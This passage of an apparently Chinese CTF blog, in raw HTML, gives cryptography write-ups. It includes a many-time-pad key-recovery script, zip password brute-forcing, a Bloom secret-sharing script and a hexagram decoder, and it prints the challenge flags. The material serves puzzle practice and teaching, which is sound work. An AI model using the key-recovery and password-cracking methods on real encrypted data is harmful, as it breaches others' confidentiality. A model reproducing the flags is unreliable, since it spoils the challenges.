    key <span class="token operator">=</span> strxor<span class="token punctuation">(</span>target_cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target_plaintext<span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">"Decrypted msg:"</span>
    <span class="token keyword">for</span> cipher <span class="token keyword">in</span> ciphers<span class="token punctuation">:</span>
        <span class="token keyword">print</span> strxor<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">"nPrivate key recovered: "</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">"n"</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> ciphers<span class="token punctuation">:</span>
    target_fix<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="AFCTF2018-你听过一次一密么"><a href="#AFCTF2018-你听过一次一密么" class="headerlink" title="[AFCTF2018]你听过一次一密么?"></a>[AFCTF2018]你听过一次一密么?</h4><p>将上面的脚本稍作修改，既数据修改一下即可。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
<span class="token comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span>
<span class="token comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span>

<span class="token keyword">import</span> string
<span class="token keyword">import</span> collections
<span class="token keyword">import</span> sets<span class="token punctuation">,</span> sys

<span class="token comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span>

c1 <span class="token operator">=</span> <span class="token string">'25030206463d3d393131555f7f1d061d4052111a19544e2e5d'</span>
c2 <span class="token operator">=</span> <span class="token string">'0f020606150f203f307f5c0a7f24070747130e16545000035d'</span>
c3 <span class="token operator">=</span> <span class="token string">'1203075429152a7020365c167f390f1013170b1006481e1314'</span>
c4 <span class="token operator">=</span> <span class="token string">'0f4610170e1e2235787f7853372c0f065752111b15454e0e09'</span>
c5 <span class="token operator">=</span> <span class="token string">'081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18'</span>
c6 <span class="token operator">=</span> <span class="token string">'0909075412132e247436425332281a1c561f04071d520f0b11'</span>
c7 <span class="token operator">=</span> <span class="token string">'4116111b101e2170203011113a69001b475206011552050219'</span>
c8 <span class="token operator">=</span> <span class="token string">'041006064612297020375453342c17545a01451811411a470e'</span>
c9 <span class="token operator">=</span> <span class="token string">'021311114a5b0335207f7c167f22001b44520c15544801125d'</span>
c10 <span class="token operator">=</span> <span class="token string">'06140611460c26243c7f5c167f3d015446010053005907145d'</span>
c11 <span class="token operator">=</span> <span class="token string">'0f05110d160f263f3a7f4210372c03111313090415481d49'</span>
ciphers <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">,</span> c4<span class="token punctuation">,</span> c5<span class="token punctuation">,</span> c6<span class="token punctuation">,</span> c7<span class="token punctuation">,</span> c8<span class="token punctuation">,</span> c9<span class="token punctuation">,</span> c10<span class="token punctuation">,</span> c11<span class="token punctuation">]</span>


<span class="token comment"># The target ciphertext we want to crack</span>
<span class="token comment"># target_cipher = "0529242a631234122d2b36697f13272c207f2021283a6b0c7908"</span>

<span class="token comment"># XORs two string</span>
<span class="token keyword">def</span> <span class="token function">strxor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># xor two strings (trims the longer input)</span>
    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">target_fix</span><span class="token punctuation">(</span>target_cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># To store the final key</span>
    final_key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">150</span>
    <span class="token comment"># To store the positions we know are broken</span>
    known_key_positions <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># For each ciphertext</span>
    <span class="token keyword">for</span> current_index<span class="token punctuation">,</span> ciphertext <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>
        counter <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># for each other ciphertext</span>
        <span class="token keyword">for</span> index<span class="token punctuation">,</span> ciphertext2 <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> current_index <span class="token operator">!=</span> index<span class="token punctuation">:</span>  <span class="token comment"># don't xor a ciphertext with itself</span>
                <span class="token keyword">for</span> indexOfChar<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>
                        strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ciphertext2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Xor the two ciphertexts</span>
                    <span class="token comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)</span>
                    <span class="token keyword">if</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable <span class="token keyword">and</span> char<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> counter<span class="token punctuation">[</span>
                        indexOfChar<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># Increment the counter at this index</span>
        knownSpaceIndexes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

        <span class="token comment"># Loop through all positions where a space character was possible in the current_index cipher</span>
        <span class="token keyword">for</span> ind<span class="token punctuation">,</span> val <span class="token keyword">in</span> counter<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span>
            <span class="token keyword">if</span> val <span class="token operator">>=</span> <span class="token number">7</span><span class="token punctuation">:</span> knownSpaceIndexes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ind<span class="token punctuation">)</span>
        <span class="token comment"># print knownSpaceIndexes # Shows all the positions where we now know the key!</span>

        <span class="token comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span>
        xor_with_spaces <span class="token operator">=</span> strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span> <span class="token operator">*</span> <span class="token number">150</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> index <span class="token keyword">in</span> knownSpaceIndexes<span class="token punctuation">:</span>
            <span class="token comment"># Store the key's value at the correct position</span>
            final_key<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> xor_with_spaces<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
            <span class="token comment"># Record that we known the key at this position</span>
            known_key_positions<span class="token punctuation">.</span>add<span class="token punctuation">(</span>index<span class="token punctuation">)</span>

    <span class="token comment"># Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)</span>
    final_key_hex <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>val <span class="token keyword">if</span> val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token string">'00'</span> <span class="token keyword">for</span> val <span class="token keyword">in</span> final_key<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token comment"># Xor the currently known key with the target cipher</span>
    output <span class="token operator">=</span> strxor<span class="token punctuation">(</span>target_cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> final_key_hex<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">"Fix this sentence:"</span>
    <span class="token keyword">print</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>char <span class="token keyword">if</span> index <span class="token keyword">in</span> known_key_positions <span class="token keyword">else</span> <span class="token string">'*'</span> <span class="token keyword">for</span> index<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"n"</span>

    <span class="token comment"># WAIT.. MANUAL STEP HERE</span>
    <span class="token comment"># This output are printing a * if that character is not known yet</span>
    <span class="token comment"># fix the missing characters like this: "Let*M**k*ow if *o&#123;*a" = "cure, Let Me know if you a"</span>
    <span class="token comment"># if is too hard, change the target_cipher to another one and try again</span>
    <span class="token comment"># and we have our key to fix the entire text!</span>

    <span class="token comment"># sys.exit(0) #comment and continue if u got a good key</span>

    target_plaintext <span class="token operator">=</span> <span class="token string">"ever if the key is kept s"</span>
    <span class="token keyword">print</span> <span class="token string">"Fixed:"</span>
    <span class="token keyword">print</span> target_plaintext <span class="token operator">+</span> <span class="token string">"n"</span>

    key <span class="token operator">=</span> strxor<span class="token punctuation">(</span>target_cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target_plaintext<span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">"Decrypted msg:"</span>
    <span class="token keyword">for</span> cipher <span class="token keyword">in</span> ciphers<span class="token punctuation">:</span>
        <span class="token keyword">print</span> strxor<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">"nPrivate key recovered: "</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">"n"</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> ciphers<span class="token punctuation">:</span>
    target_fix<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">nPrivate key recovered: afctf&#123;OPT_1s_Int3rest1ng&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="密码混合"><a href="#密码混合" class="headerlink" title="密码混合"></a>密码混合</h2><blockquote>
<p>有些密码题目太融合了，看起来既不像是古典，又不想是现代，还有些misc的成分在其中，就将其分入此类之中，这一类的题目直接以三级标题命名。</p>
</blockquote>
<h3 id="AFCTF2018-花开藏宝地"><a href="#AFCTF2018-花开藏宝地" class="headerlink" title="[AFCTF2018]花开藏宝地"></a>[AFCTF2018]花开藏宝地</h3><p>给出了5个压缩包，应该是每个压缩包对应的都是一种知识点。</p>
<h4 id="Secret1"><a href="#Secret1" class="headerlink" title="Secret1"></a>Secret1</h4><p>直接对压缩包进行爆破，看起来这一关有些misc的成分混杂于其中了。key是<code>19260817</code></p>
<p><img src="/2021/05/28/CTF/image-20210729163233973.png" style="zoom:67%;"></p>
<h4 id="Secret2"><a href="#Secret2" class="headerlink" title="Secret2"></a>Secret2</h4><p>提示是人名，然后就是大小写字母喽，直接再爆破得key2:<code>alice</code></p>
<p><img src="/2021/05/28/CTF/image-20210729164351421.png" style="zoom: 67%;"></p>
<h4 id="Secret4"><a href="#Secret4" class="headerlink" title="Secret4"></a>Secret4</h4><p>zip伪加密，修改一下标志位即可。</p>
<h4 id="Bloom门限方案"><a href="#Bloom门限方案" class="headerlink" title="Bloom门限方案"></a>Bloom门限方案</h4><p><a target="_blank" rel="noopener" href="https://webencrypt.org/secretsharing/#bloom">Bloom门限参考链接</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">a1 <span class="token operator">=</span><span class="token number">100459779913520540098065407420629954816677926423356769524759072632219106155849450125185205557491138357760494272691949199099803239098119602186117878931534968435982565071570831032814288620974807498206233914826253433847572703407678712965098320122549759579566316372220959610814573945698083909575005303253205653244238542300266460559790606278310650849881421791081944960157781855164700773081375247</span>
d1 <span class="token operator">=</span><span class="token number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820820091</span>
a2 <span class="token operator">=</span><span class="token number">305345133911395218573790903508296238659147802274031796643017539011648802808763162902335644195648525375518941848430114497150082025133000033835083076541927530829557051524161069423494451667848236452337271862085346869364976989047180532167560796470067549915390773271207901537847213882479997325575278672917648417868759077150999044891099206133296336190476413164240995177077671480352739572539631359</span>
d2 <span class="token operator">=</span><span class="token number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820813413</span>
a3 <span class="token operator">=</span> <span class="token number">152012681270682340051690627924586232702552460810030322267827401771304907469802591861912921281833890613186317787813611372838066924894691892444503039545946728621696590087591246339208248647926966446848123290344911662916758039134817404720512465817867255277476717353439505243247568126193361558042940352204093381260402400739429050280526212446967632582771424597203000629197487733610187359662268583</span>
d3 <span class="token operator">=</span><span class="token number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553</span>

dd <span class="token operator">=</span> d1<span class="token operator">*</span>d2<span class="token operator">*</span>d3

t1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>dd<span class="token operator">//</span>d1<span class="token punctuation">,</span>d1<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span>d1<span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>t1<span class="token operator">*</span>d2<span class="token operator">*</span>d3<span class="token operator">%</span>d1 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>

t2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>dd<span class="token operator">//</span>d2<span class="token punctuation">,</span>d2<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span>d2<span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>t2<span class="token operator">*</span>d1<span class="token operator">*</span>d3<span class="token operator">%</span>d2 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>

t3 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>dd<span class="token operator">//</span>d3<span class="token punctuation">,</span>d3<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span>d3<span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>t3<span class="token operator">*</span>d2<span class="token operator">*</span>d1<span class="token operator">%</span>d3 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>

s <span class="token operator">=</span> a1<span class="token operator">*</span>t1<span class="token operator">*</span>d2<span class="token operator">*</span>d3<span class="token operator">+</span>a2<span class="token operator">*</span>t2<span class="token operator">*</span>d1<span class="token operator">*</span>d3<span class="token operator">+</span>a3<span class="token operator">*</span>t3<span class="token operator">*</span>d1<span class="token operator">*</span>d2
p <span class="token operator">=</span> <span class="token number">80804238007977405688648566160504278593148666302626415149704905628622876270862865768337953835725801963142685182510812938072115996355782396318303927020705623120652014080032809421180400984242061592520733710243483947230962631945045134540159517488288781666622635328316972979183761952842010806304748313326215619695085380586052550443025074501971925005072999275628549710915357400946408857</span>
s <span class="token operator">%=</span> dd
<span class="token comment"># print(hex(s))</span>
s <span class="token operator">%=</span> p
s <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
flag <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
<span class="token comment"># A treasure map is a map that marks the location of buried treasure, a lost mine, a valuable secret or a hidden locale. So flag is afctf&#123;1sn't_s0_int3Resting&#125;.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a target="_blank" rel="noopener" href="http://www.matrix67.com/blog/archives/1261">参考链接</a></p>
<h4 id="BJDCTF2020-伏羲六十四卦"><a href="#BJDCTF2020-伏羲六十四卦" class="headerlink" title="[BJDCTF2020]伏羲六十四卦"></a>[BJDCTF2020]伏羲六十四卦</h4><p>给出的附件有个什么六十四卦的编码，我一看就懵逼了，这又是什么古怪的编码？官方wp给出的解码脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'升随临损巽睽颐萃小过讼艮颐小过震蛊屯未济中孚艮困恒晋升损蛊萃蛊未济巽解艮贲未济观豫损蛊晋噬嗑晋旅解大畜困未济随蒙升解睽未济井困未济旅萃未济震蒙未济师涣归妹大有'</span>
mydisc<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>
keys<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'坤'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">,</span> <span class="token 